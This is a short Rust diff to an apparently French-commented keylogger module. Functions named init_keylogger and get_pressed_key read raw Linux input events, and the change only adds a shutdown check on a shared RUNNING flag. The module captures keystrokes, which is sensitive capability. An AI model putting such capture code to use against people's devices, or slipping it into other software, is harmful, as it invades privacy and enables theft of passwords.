@@ -12,6 +12,8 @@ use std::io::{self};
 use std::io::{Cursor, Read};
 use udev::Enumerator; // Importation du trait Write
 
+use crate::RUNNING;
+
 pub fn init_keylogger(is_qwerty: &mut bool) -> HashMap<u16, String> {
     // Charger la carte de correspondance de touches
     let file_path = "/usr/include/linux/input-event-codes.h";
@@ -162,6 +164,9 @@ pub fn get_pressed_key(path: &Path, keycode_map: &HashMap<u16, String>) -> Optio
 
     let mut packet = [0u8; 24];
     loop {
+        if !RUNNING.load(std::sync::atomic::Ordering::Relaxed) {
+            return None;
+        }
         if let Err(err) = event_file.read_exact(&mut packet) {
             eprintln!(
                 "Erreur lors de la lecture des données dans {:?} : {}",
